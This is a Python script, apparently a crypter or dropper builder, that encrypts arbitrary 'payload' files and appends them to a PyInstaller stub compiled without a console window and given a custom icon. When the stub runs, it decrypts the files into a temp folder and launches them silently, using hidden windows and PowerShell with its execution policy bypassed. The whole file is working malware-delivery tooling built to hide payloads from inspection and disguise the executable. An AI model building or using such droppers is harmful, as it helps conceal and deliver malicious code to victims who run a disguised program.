#!/usr/bin/env python3

import argparse
import json
import os
import shutil
import struct
import subprocess
import sys

from cryptography.fernet import Fernet
from PIL import Image

MAGIC         = b"FVEIL01\x00"
STUB_FILENAME = "_sfx_stub.py"
BUILT_EXE     = "dist/_sfx_stub.exe"

STUB_SOURCE = '''
import json
import os
import struct
import subprocess
import sys
import tempfile

from cryptography.fernet import Fernet, InvalidToken

MAGIC      = b"FVEIL01\\x00"
KEY_MARKER = b"FVEILKEY"


def find_marker(data: bytes, marker: bytes) -> int:
    idx = data.rfind(marker)
    if idx == -1:
        sys.exit(1)
    return idx


def run_file(path: str):
    ext = os.path.splitext(path)[1].lower()

    if ext in (".bat", ".cmd"):
        return subprocess.Popen(
            ["cmd.exe", "/c", path],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    elif ext == ".exe":
        return subprocess.Popen([path])
    elif ext == ".py":
        return subprocess.Popen([sys.executable, path])
    elif ext == ".ps1":
        return subprocess.Popen(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", path],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    elif ext == ".vbs":
        return subprocess.Popen(
            ["wscript.exe", path],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    else:
        return subprocess.Popen(
            ["cmd.exe", "/c", "start", "", path],
            creationflags=subprocess.CREATE_NO_WINDOW
        )


def main():
    exe_path = sys.executable if getattr(sys, "frozen", False) else __file__
    with open(exe_path, "rb") as f:
        self_data = f.read()

    key_idx    = find_marker(self_data, KEY_MARKER)
    fernet_key = self_data[key_idx + len(KEY_MARKER): key_idx + len(KEY_MARKER) + 44]

    pay_idx   = find_marker(self_data, MAGIC)
    pos       = pay_idx + len(MAGIC)
    token_len = struct.unpack(">I", self_data[pos:pos + 4])[0]
    pos      += 4
    token     = self_data[pos:pos + token_len]

    try:
        plain_blob = Fernet(fernet_key).decrypt(token)
    except InvalidToken:
        sys.exit(1)

    header_len = struct.unpack(">I", plain_blob[:4])[0]
    header     = json.loads(plain_blob[4:4 + header_len].decode("utf-8"))
    offset     = 4 + header_len

    tmp_dir    = tempfile.mkdtemp(prefix="sfx_")
    file_paths = []

    for entry in header["files"]:
        size     = entry["size"]
        data     = plain_blob[offset:offset + size]
        offset  += size
        out_path = os.path.join(tmp_dir, entry["name"])
        with open(out_path, "wb") as f:
            f.write(data)
        file_paths.append(out_path)

    processes = []
    for path in file_paths:
        p = run_file(path)
        if p is not None:
            processes.append(p)

    for p in processes:
        p.wait()


if __name__ == "__main__":
    main()
'''


def image_to_ico(image_path: str) -> str:
    img      = Image.open(image_path).convert("RGBA")
    sizes    = [(256, 256), (128, 128), (64, 64), (48, 48), (32, 32), (16, 16)]
    ico_path = "_temp_icon.ico"
    img.save(ico_path, format="ICO", sizes=sizes)
    print(f"      Ikon dibuat dari : {image_path}")
    return ico_path


def pack_files(paths: list[str]) -> bytes:
    entries = []
    blob    = bytearray()
    for p in paths:
        with open(p, "rb") as f:
            data = f.read()
        entries.append({"name": os.path.basename(p), "size": len(data)})
        blob += data
    header = json.dumps({"files": entries}).encode("utf-8")
    return struct.pack(">I", len(header)) + header + bytes(blob)


def build_sfx(payload_paths: list[str], output_name: str, icon_path: str = None):
    print("[1/5] Menulis stub source...")
    with open(STUB_FILENAME, "w", encoding="utf-8") as f:
        f.write(STUB_SOURCE)

    ico_file        = None
    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--name", "_sfx_stub",
        STUB_FILENAME,
    ]

    if icon_path and os.path.exists(icon_path):
        ico_file = image_to_ico(icon_path)
        pyinstaller_cmd += ["--icon", ico_file]
        print("[2/5] Kompilasi stub dengan ikon custom...")
    else:
        print("[2/5] Kompilasi stub tanpa ikon custom...")

    result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)

    if ico_file and os.path.exists(ico_file):
        os.remove(ico_file)

    if result.returncode != 0:
        print("[GAGAL] PyInstaller error:")
        print(result.stderr[-2000:])
        sys.exit(1)

    print("[3/5] Pack & enkripsi payload...")
    plain_blob = pack_files(payload_paths)
    fernet_key = Fernet.generate_key()
    token      = Fernet(fernet_key).encrypt(plain_blob)

    payload_appended = MAGIC + struct.pack(">I", len(token)) + token

    print("[4/5] Append key + payload ke exe...")
    with open(BUILT_EXE, "rb") as f:
        stub_exe = f.read()

    final_exe   = stub_exe + b"FVEILKEY" + fernet_key + payload_appended
    output_path = output_name if output_name.endswith(".exe") else output_name + ".exe"

    with open(output_path, "wb") as f:
        f.write(final_exe)

    print(f"[5/5] Selesai!")
    print(f"      Output  : {output_path}")
    print(f"      Ukuran  : {len(final_exe):,} bytes")
    print(f"      Payload : {len(payload_paths)} file")
    print(f"      Ikon    : {icon_path if icon_path else 'default'}")
    print()
    for i, p in enumerate(payload_paths, 1):
        print(f"      [{i}] {os.path.basename(p)}")

    os.remove(STUB_FILENAME)
    shutil.rmtree("dist",  ignore_errors=True)
    shutil.rmtree("build", ignore_errors=True)
    if os.path.exists("_sfx_stub.spec"):
        os.remove("_sfx_stub.spec")


def main():
    parser = argparse.ArgumentParser(
        description="SFX Builder dengan ikon custom dari PNG/JPG."
    )
    parser.add_argument("-p", "--payload", required=True, nargs="+",
                        help="File payload (semua dieksekusi bersamaan)")
    parser.add_argument("-o", "--output",  required=True,
                        help="Nama output exe")
    parser.add_argument("--icon", default=None,
                        help="Gambar untuk ikon exe (PNG/JPG)")
    args = parser.parse_args()

    for p in args.payload:
        if not os.path.exists(p):
            print(f"[GAGAL] File tidak ditemukan: {p}")
            sys.exit(1)

    if args.icon and not os.path.exists(args.icon):
        print(f"[GAGAL] File ikon tidak ditemukan: {args.icon}")
        sys.exit(1)

    build_sfx(args.payload, args.output, args.icon)


if __name__ == "__main__":
    main()